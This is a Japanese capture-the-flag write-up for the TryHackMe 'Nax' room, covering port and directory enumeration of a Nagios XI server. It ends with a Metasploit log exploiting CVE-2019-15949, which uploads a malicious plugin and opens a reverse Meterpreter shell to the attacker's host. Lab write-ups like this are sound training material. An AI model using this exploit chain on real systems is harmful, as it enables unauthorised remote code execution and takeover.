# Nax CTF

https://tryhackme.com/room/nax

## Enumeration

```shell
TARGET=10.10.57.40
sudo bash -c "echo $TARGET   nax.thm >> /etc/hosts"
```

### ポートスキャン

```sh
rustscan -a $TARGET

Open 10.10.57.40:25
Open 10.10.57.40:22
Open 10.10.57.40:80
Open 10.10.57.40:389
Open 10.10.57.40:443
Open 10.10.57.40:5667
```

```sh
sudo nmap -sS -sV -p22,25,80,389,443,5667 $TARGET

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
25/tcp   open  smtp       Postfix smtpd
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   Apache httpd 2.4.18 ((Ubuntu))
5667/tcp open  tcpwrapped
MAC Address: 02:4A:95:3C:9B:BF (Unknown)
Service Info: Host:  ubuntu.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

SSH, SMTP, HTTP, LDAP, HTTPS, TCPwrapped

トップページのHTMLコメント

```html
<! --/nagiosxi/ --> 
```

### gobuster

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -x=txt,php -u http://$TARGET -w ./dirlist.txt -t 30 -k

===============================================================
/.php                 (Status: 403) [Size: 276]
/index.php            (Status: 200) [Size: 2968]
/javascript           (Status: 301) [Size: 315] [--> http://10.10.57.40/javascript/]
/nagios               (Status: 401) [Size: 458]
===============================================================
```

/nagios

```sh
===============================================================
/about                (Status: 301) [Size: 319] [--> http://10.10.57.40/nagiosxi/about/]
/account              (Status: 301) [Size: 321] [--> http://10.10.57.40/nagiosxi/account/]
/admin                (Status: 301) [Size: 319] [--> http://10.10.57.40/nagiosxi/admin/]
/api                  (Status: 301) [Size: 317] [--> http://10.10.57.40/nagiosxi/api/]
/backend              (Status: 301) [Size: 321] [--> http://10.10.57.40/nagiosxi/backend/]
/config               (Status: 301) [Size: 320] [--> http://10.10.57.40/nagiosxi/config/]
/db                   (Status: 301) [Size: 316] [--> http://10.10.57.40/nagiosxi/db/]
/help                 (Status: 301) [Size: 318] [--> http://10.10.57.40/nagiosxi/help/]
/images               (Status: 301) [Size: 320] [--> http://10.10.57.40/nagiosxi/images/]
/includes             (Status: 301) [Size: 322] [--> http://10.10.57.40/nagiosxi/includes/]
/index.php            (Status: 302) [Size: 27] [--> http://10.10.57.40/nagiosxi/login.php?redirect=/nagiosxi/index.php%3f&noauth=1]
/install.php          (Status: 302) [Size: 0] [--> http://10.10.57.40/nagiosxi/]
/login.php            (Status: 200) [Size: 25330]
Progress: 500002 / 681573 (73.36%)[ERROR] Get "http://10.10.57.40/nagiosxi/onlinecatalog.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/reports              (Status: 301) [Size: 321] [--> http://10.10.57.40/nagiosxi/reports/]
/rr.php               (Status: 302) [Size: 0] [--> login.php]
/suggest.php          (Status: 200) [Size: 0]
/tools                (Status: 301) [Size: 319] [--> http://10.10.57.40/nagiosxi/tools/]
/upgrade.php          (Status: 302) [Size: 0] [--> index.php]
/views                (Status: 301) [Size: 319] [--> http://10.10.57.40/nagiosxi/views/]
===============================================================
```

dirsearch /nagiosxi

```sh
[08:57:00] 301 -  311B  - /nagiosxi/about  ->  http://nax.thm/nagiosxi/about/
[08:57:01] 301 -  313B  - /nagiosxi/account  ->  http://nax.thm/nagiosxi/account/
[08:57:02] 302 -   27B  - /nagiosxi/account/  ->  http://nax.thm/nagiosxi/login.php?redirect=/nagiosxi/account/index.php%3f&noauth=1
[08:57:04] 301 -  311B  - /nagiosxi/admin  ->  http://nax.thm/nagiosxi/admin/
[08:57:05] 302 -   27B  - /nagiosxi/admin/  ->  http://nax.thm/nagiosxi/login.php?redirect=/nagiosxi/admin/index.php%3f&noauth=1
[08:57:06] 302 -   27B  - /nagiosxi/admin/index.php  ->  http://nax.thm/nagiosxi/login.php?redirect=/nagiosxi/admin/index.php%3f&noauth=1
[08:57:20] 301 -  309B  - /nagiosxi/api  ->  http://nax.thm/nagiosxi/api/   
[08:57:21] 301 -  312B  - /nagiosxi/api/v1  ->  http://nax.thm/nagiosxi/api/v1/
[08:57:21] 200 -   32B  - /nagiosxi/api/v1/swagger.json                     
[08:57:21] 200 -   32B  - /nagiosxi/api/v1/
[08:57:21] 200 -   32B  - /nagiosxi/api/v1/swagger.yaml
[08:57:24] 200 -  104B  - /nagiosxi/backend/                                
[08:57:32] 301 -  312B  - /nagiosxi/config  ->  http://nax.thm/nagiosxi/config/
[08:57:32] 200 -    0B  - /nagiosxi/config.inc.php                          
[08:57:32] 302 -   27B  - /nagiosxi/config/  ->  http://nax.thm/nagiosxi/login.php?redirect=/nagiosxi/config/index.php%3f&noauth=1
[08:57:36] 301 -  308B  - /nagiosxi/db  ->  http://nax.thm/nagiosxi/db/     
[08:57:47] 301 -  310B  - /nagiosxi/help  ->  http://nax.thm/nagiosxi/help/ 
[08:57:48] 302 -   27B  - /nagiosxi/help/  ->  http://nax.thm/nagiosxi/login.php?redirect=/nagiosxi/help/index.php%3f&noauth=1
[08:57:49] 301 -  312B  - /nagiosxi/images  ->  http://nax.thm/nagiosxi/images/
[08:57:49] 403 -  272B  - /nagiosxi/images/
[08:57:50] 301 -  314B  - /nagiosxi/includes  ->  http://nax.thm/nagiosxi/includes/
[08:57:50] 302 -   27B  - /nagiosxi/index.php  ->  http://nax.thm/nagiosxi/login.php?redirect=/nagiosxi/index.php%3f&noauth=1
[08:57:50] 302 -   27B  - /nagiosxi/index.php/login/  ->  http://nax.thm/nagiosxi/login.php?redirect=/nagiosxi/index.php/login/%3f&noauth=1
[08:57:51] 302 -    0B  - /nagiosxi/install.php  ->  http://nax.thm/nagiosxi/
[08:57:51] 302 -    0B  - /nagiosxi/install.php?profile=default  ->  http://nax.thm/nagiosxi/
[08:57:56] 200 -    6KB - /nagiosxi/login.php                               
[08:58:16] 301 -  313B  - /nagiosxi/reports  ->  http://nax.thm/nagiosxi/reports/
[08:58:30] 301 -  311B  - /nagiosxi/tools  ->  http://nax.thm/nagiosxi/tools/
[08:58:30] 302 -   27B  - /nagiosxi/tools/  ->  http://nax.thm/nagiosxi/login.php?redirect=/nagiosxi/tools/index.php%3f&noauth=1
[08:58:31] 302 -    0B  - /nagiosxi/upgrade.php  ->  index.php              
[08:58:34] 301 -  311B  - /nagiosxi/views  ->  http://nax.thm/nagiosxi/views/
```

Nagios XI のデフォルト認証（nagiosadmin / nagiosadmin）は使えなかった。

```
Welcome to elements.
Ag - Hg - Ta - Sb - Po - Pd - Hg - Pt - Lr
```

元素番号をASCIIとして解釈すると、ファイル名が出てきて、exiftool で作者名を確認できる。

Nagios XI の認証情報取得については、https://ceisc.co.uk/thm-nax/ 参照。

## Nagios XI エクスプロイト（CVE-2019-15949）

```sh
msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > set RHOSTS 10.10.57.40
RHOSTS => 10.10.57.40
msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > set LHOST 10.13.85.243
LHOST => 10.13.85.243
msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > set PASSWORD [REDACTED]
PASSWORD => [REDACTED]
msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > run
[*] Started reverse TCP handler on 10.13.85.243:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Attempting to authenticate to Nagios XI...
[+] Successfully authenticated to Nagios XI.
[*] Target is Nagios XI with version 5.5.6.
[+] The target appears to be vulnerable.
[*] Uploading malicious 'check_ping' plugin...
[*] Command Stager progress - 100.00% done (897/897 bytes)
[+] Successfully uploaded plugin.
[*] Executing plugin...
[*] Waiting up to 300 seconds for the plugin to request the final payload...
[*] Sending stage (3045380 bytes) to 10.10.57.40
[*] Meterpreter session 1 opened (10.13.85.243:4444 -> 10.10.57.40:46280) at 2025-06-15 10:19:03 +0900
[*] Deleting malicious 'check_ping' plugin...
[+] Plugin deleted.

meterpreter > 
```

あとは無制限sudoが付いているので、なんでもできる。

## 振り返り

- 元素番号はまだしも、npiet の不備はいただけない。高評価率の異常な低さに納得。
- npiet というものがあるということだけは勉強になった。
